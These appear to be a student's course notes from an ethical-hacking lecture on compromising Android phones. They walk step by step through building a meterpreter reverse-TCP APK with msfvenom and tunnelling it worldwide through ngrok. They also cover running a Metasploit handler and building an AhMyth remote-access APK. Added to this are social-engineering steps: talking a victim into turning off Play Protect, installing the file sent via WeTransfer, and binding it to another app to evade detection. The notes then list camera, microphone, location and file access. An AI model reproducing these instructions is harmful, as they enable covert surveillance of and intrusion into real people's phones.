#WsCubeTech-CEH-notes

---
### What we'll learn 
> Lecture Name : Android Hacking using Msfvenom & Ahmyth
> 1) About : Payloads & working of it
> 2) Practical Work : 
> 	1) making android payload via msfvenom tool
> 	2) sharing payload file world-wide via Ahmyth tool 

---
### About : Payloads & working of it
- About Payloads
	- are malicious programs which runs on backend of the system
	- Pros of it : gives long-term access of a system
- Working of it
	- we - as a attacker : send a payload to Victim's system <br>then Victim's system has a firewall (which contains Rules & Regulations) <br>- so if any Rules & Regulations of Firewall (of Victim's system) - then the firewall block the IP (of an attacker)
	- so we don't install a payload to Victim's system <br>Q : then what we do <br>Ans : we just manipulate Victim - so that he/she can install on his/her own System <br>- so Victim will install the payload on his/her system
	- so once Victim will install the payload - then his/her system's firewall will not stop <br>Eg : if user install "AnyDesk" software on his system - then user allow someone to access his/her own system <br>- then firewall (of user's system) - never stop to give access & there are very less change that firewall will stop
	- but firewall (of a person's system) - mostly keep protection from outside networks/devices
	- Q : LHost & LPORT - of which system : Attacker or Victim <br>Ans : local (Host + Port) is of Attacker
	- Conclusion : ✔<br>- if we try to access + install a payload on Victim's system - then firewall (of Victim's system) will block the IP (of Attacker) <br>- that's why we try to convince Victim - to install that payload on his/her own system <br>then firewall (of Victim's system) will not block IP (of attacker)

### 1st Practical Work : making android payload via msfvenom tool
- STEP 0 : `sudo su`
- STEP 1 : run `msfvenom --help` - to know more about it
	- output : useful options of it i.e `-l`
- STEP 2 : run `msfvenom -l payload`
	- 1st option -> `-l` : means list & which list u want i.e payload (which is defined as 2nd option)<br>2nd option -> `payload` : means we want payload list
	- output : many payloads will come like for windows OS , OSX (means macOS) , python , etc
	- we want android payload <br>![[25_lecture-0-M3.jpg | 500]]
	- Q : acc. to u which one protocol we need for android payload - TCP or HTTP <br>Ans : i.e TCP protocol - cuz both HTTP & HTTPS use TCP protocol ✔ <br>- so use `android/meterpreter_reverse_tcp` android payload
	- STEP 2.1 : copy `android/meterpreter_reverse_tcp` android payload
	- STEP 2.2 : one more option required , run `msfvenom -h`
		- output : <br>![[25_lecture-1-M3.jpg | 500]]
		- in output , `-p` : use to set payload & `-e` : use to set encoder <br>- currently we need payload
		- `Note ✅` : in android hacking , we don't make reports - we make apk file - cuz android OS supports apk files ✔<br>- & we make xml & html report files for OS like linux , windows , mac - cuz these OS supports xml , html files
	- STEP 2.3 : go to that directory where ngrok installed , run `./ngrok tcp 8080`
		- Note : never start ngrok like this "`./ngrok`" , it'll always start with a port no. ✔
		- `imp Note ✅` : never use "http" protocol to generate a world-wide link via ngrok <br>- cuz http & https - both used to transfer the data & both use "tcp" protocol <br>- so always use "tcp" protocol to make world-wide link via ngrok ✔ <br>- & even if u use "http" protocol - then that world-wide link won't work
		- output : forwarding IP-address will be created via ngrok
	- STEP 2.4 : copy the IP "0.tcp.in.ngrok.io" & port no. "14097" from "forwarding" link & paste them in STEP 2.3 
	- STEP 2.5 : run `msfvenom -p android/meterpreter_reverse_tcp lhost 0.tcp.in.ngrok.io lport 14097 >amit.apk`
		- in command , ✔
			- "`android/meterpreter_reverse_tcp`" : is a payload
			- to make a connection - in which we want listening i.e LHOST & LPORT <br>- "`LHOST 0.tcp.in.ngrok.io`" : is a world-wide IP generated via ngrok - in order to make connection world-wide & <br>- "`LPORT 14097`" : here we put the port no. - which is generated via ngrok , not any custom port no. of like 8686
			- ">amit.apk" : means "`>`" used to save the payload in a apk file
		- `imp Note ✅` :  ✔
			- we didn't pasted the IPv4 of Kali OS - cuz it'll not give world wide access <br>that's why we use ngrok to generate a world-wide link
			- but if we're making connection inside local to local : means in our own local system <br>- then we can use IPv4 of KaliOS instead of ngrok
		- output : Error : One or More options failed to validate LHOST , LPORT <br>- skip this error - cuz the apk file is created
	- STEP 2.4 : run `ls` , output : amit.apk will be shown
	- till yet we created a apk file - but we also need to do listening (means from where that connection should be connected)<br>- so for listening the connection (which is created) - use "msfconsole" tool ✔
- STEP 3 : `service postgresql start` : starting database service of msfconsole tool
	- Note : "msfconsole" doesn't run in root directory , run it in normal mode ✔
	- STEP 3.0 : run `msfconsole`
	- STEP 3.1 : in msf6 , run `use exploit/multi/handler`
		- "exploit/multi/handler" : used handle + manages multiple network sessions , Eg : connecting , etc ✔
		- mine thought : <br>so here "exploit/multi/handler" - will be used to handle the network session of listening that payload connection <br>once connection gets established with a Victim's android phone
	- STEP 3.2 : run `set ExitOnSession false`
		- "ExitOnSession false" : means ✔<br>- generally whenever we try to make a connection for listening - then connection gets break <br>& once connection gets break - then listening also gets stop <br>- so due to this statement , when connection gets lost/break - then listening will stay ON
		- "set" : used to set the options like IP , port no. etc <br>& "use" : used to use something like payload , exploit , etc✔
		- output : <br>![[25_lecture-2-M3.jpg | 500]]
	- STEP 3.3 : run `use payload/android/meterpreter_reverse_tcp`
		- "payload/android/meterpreter_reverse_tcp" : here before "android" - add "payload/" - to tell that we're using payload
		- output : now "android/meterpreter_reverse_tcp" - we're using it as payload <br>![[25_lecture-3-M3.jpg | 500]]
	- STEP 3.4 : run `options`
		- output <br>![[25_lecture-4-M3.jpg | 500]]
		- in output , it's showing Listening HOST & Listening PORT
		- Q : so we need put LHOST but acc. to u which one IP we need put in LHOST ✔
		- Ans : pic <br>![[25_lecture-5-M3.jpg | 500]] <br>- in "forwarding" column : <br>> when a user comes on this URL address "tcp://0.tcp.in.ngrok.io:14097" <br>then ngrok will send that user directly on our "localhost:8080" <br>- so ngrok is sending that user on our "localhost:8080" - then no need put this IP i.e "tcp://0.tcp.in.ngrok.io:14097" ✔<br>- so we'll give IP of our localhost i.e 127.0.0.1 - cuz ngrok is forwarding a user to our localhost ✔
	- STEP 3.5 : run `set lhost 127.0.0.1`
	- STEP 3.6 : now reset the LPORT - cuz "msfconcole" takes by-default a port no. - here i.e 4444 - which is wrong <br>- run `set lport 8080` <br>- output : <br>![[25_lecture-6-M3.jpg | 500]]
	- now when u this payload on someone's android phone - then connection will be shown
- STEP 4 : run `run -j OR run OR exploit` : use any one command <br>output : once u run then sessions will be created & files will be shown
	- STEP 4.0 : after running one of the command from STEP 4 - if connection is not established <br>- then re-write the commands in "msf" from STEP 3.1 & use the "set" with "exploit/multi/handler"

### 2nd Practical Work : sharing apk file world-wide via Ahmyth tool 
- STEPS : using online tool
	- STEP 1 go to https://wetransfer.com - in order to world-wide send/share the link to any victim
	- STEP 2 : upload "amit.apk" & click "get a link" button
	- Note : this tool has a time duration to expire the link
	- STEP 3 : tell the Victim close the "play protection" of android phone before downloading the file <br> - Note : cuz in android phone , "PlayStore" block the apk from downloading outside ✔
- STEPS : using terminal based tool - ahmyth
	- if "wetransfer" doesn't work then use alternatives (google drive , dropbox , etc)
	- STEP 1 : [GitHub - Rabbit-xd/AhMyth: Android Remote Administration Tool](https://github.com/Rabbit-xd/AhMyth)<br>- Note : use AhMyth of Rabbit-xd , don't use AhMyth-android-RAT
	- Note : only download it from Rabbit-xd github
	- STEP 2 : come to "Kali & Debian installtion" section & follow firstly those 2 commands <br>> 1. `git clone https://github.com/Morsmalleo/AhMyth.git` <br>> 2. `cd AhMyth/AhMyth-Server`
	- STEP 3 : `ls` , output : "autoinstall_linux" u'll see <br>- Note ✅ : only give executable permission & install this file - not anyone else
	- STEP 4 : run `chmod +x autoinstall_linux` & hit enter <br>STEP 4.1 : run `./autoinstall_linux`
	- Note : if any error comes while installing/running Ahmyth - then run any one of these commands inside "/home/kali/AhMyth/AhMyth-Server"<br>1) `npm install && npm audit` <br>2) `npm start` <br>3) `npm --fix audit` <br>4) `npm --force audit fix`
	- STEP 5 : run `aymyth` , output <br>![[25_lecture-7-M3.jpg | 500]]
	- STEP 6 : go to "APK builder" tab . copy & paste the IP + port no. - which is generated by ngrok <br>![[25_lecture-8-M3.jpg | 500]]
	- STEP 7 : in "Permissions Customization section , whatever access u want - so tick them all <br> except "Blind With An Original Apk"
	- STEP 8 : click on "Build" button
		- output : java error <br>![[25_lecture-9-M3.jpg | 400]]
		- STEP 8.1 : open a new terminal , run `sudo su` then `update-alternatives -config java` <br>SETP 8.1.1 : we need java 17 , run `1` <br>- now java version has been changed
		- STEP 8.2 : again click "Build" button , output : get a apk payload directory <br>![[25_lecture-10-M3.jpg | 500]]
	- STEP 9 : in terminal , run "sudo su" then `/root/AhMyth/Output` then `ls` , output : Ahmyth-aligned-debugSigned.apk
	- STEP 10 : move that file to desktop , run `cp Ahmyth-aligned-debugSigned.apk /home/kali/Desktop`
	- STEP 11 : transfer this apk payload file via wetransfer & send it to victim's android phone to install
	- so till yet we build the apk payload file
	- STEP 12 : say to Victim <br>Note : don't download the payload apk before turn off "play protect" - cuz PlayStore don't allow outsiders apk to download<br>1) Turn Off the "Play Protect" - from playstore <br>2) download & open the payload apk in android phone
	- STEP 13 : to listen the connection , in ahmyth tool - go in "Victims" tab
		- Q : which port no. we need ✔<br>Ans : the port no. which we wrote while starting ngrok i.e 8080
		- STEP 13.1 : in port-no. input field , write "8080" & click "Listen" button
		- output : in terminal panel , Listening will start on 8080
		- once that victim gets connected - then u'll see his/her Lab inside "Victims" tab , output : <br>![[25_lecture-11-M3.jpg | 500]]
		- STEP 13.2 : click on "Open the Lab" , output : u'll get many options like Camera , etc
		- STEP 13.3 : click on "Camera" , u can take either Front or Back at a time of android device - just click "Snap" <br>- output :<br>![[25_lecture-12-M3.jpg | 500]]
		- Options are <br>1) File Manager : load all the files & folders <br>2) Mic : we can record Victim's audio <br>3) Location : get the access of Victim's device location
	- Q : is Payload gives long or short term access ✔<br>Ans : long term , means we'll get long term payload access until attacker don't change listening IP
	- Q : what should Victim do to remove that payload instead of giving long term access to attacker <br>Ans : uninstall from the Victim's android phone 

---
### Homework
1. 

---
### End of the lecture (Doubts) :
1. not possible to find a illegal activities Hackers - cuz they sometimes do illegal activities - then they leave
- More commands for Ahmyth : if any issues coming in Ahmyth or it's not getting open then run these commands
	- STEP 1 : go inside /home/kali/AhMyth/AhMyth-Server/app/app/Factory/
	- STEP 2 : in "Factory" folder , run `ls` , output : a sign.jar file will be shown
	- STEP 3 : run `chmod +x sign.jar`
	- or instead of doing all above 3 steps , <br>run `chmod +x /home/kali/AhMyth/AhMyth-Server/app/app/Factory/sign.jar` 
	- STEP 4 : run `sudo apt-get install adoptopenjdk8` <br>STEP 5 : run `tap AdoptOpenJDK/openjdk`
- Q : to stop the program in kali task manager ✔
	- Ans : let's say u didn't close the "ngrok" program properly - after running "`./ngrok tcp 4444`"<br>- then u restarted the kali & when u running again the command - then it's not working - cuz u didn't closed it properly
	- STEP 1 : `top` - to run kali task manager - to see whether ngrok is closed or not
	- STEP 2 : if ngrok is not closed - run `kill <PID>` , Eg : `ngrok 2311` <br>- Advice : whenever u close the ngrok - then press `CTRL + C`
- Q : if we make that payload apk via binding - then can we upload it on playstore ✔
	- Ans : need to give money to put on playstore
	- Q : if u make developer account - then can playstore allow <br>Ans : yes it'll allow - but it'll test first
	- Q : if we as a hacker - make playstore failed in testing our payload apk , then it's possible <br>Ans : then it'll not allow to upload it , so first - testing & then uploading will happen
	- if Playstore got to know that thing is related to hacks - then i'll block it
- Q : can we make our custom payloads 
	- Ans : yes , but u need a programming language - like python
- Q : is undetectable payloads possible to make ✔
	- Ans : No , not possible 
	- Eg : in playstore , "play protect" feature don't allow to download any apk file from outside <br>cuz this feature consider that outsider apk as malware 
	- But we can make these kind of payload files as less detectable - for this - use "bind" option <br>- so bind with that apk (which u want) <br>- u can only bind with apk , not with photos ✔
- Advice : don't use ParrotOS - cuz it gives many errors , so as a beginner use only Kali
- Note : in same vmware , if u open the Kali OS - 2 different places at the same time - then u can't able to reopen the KaliOS again <br>so close them all


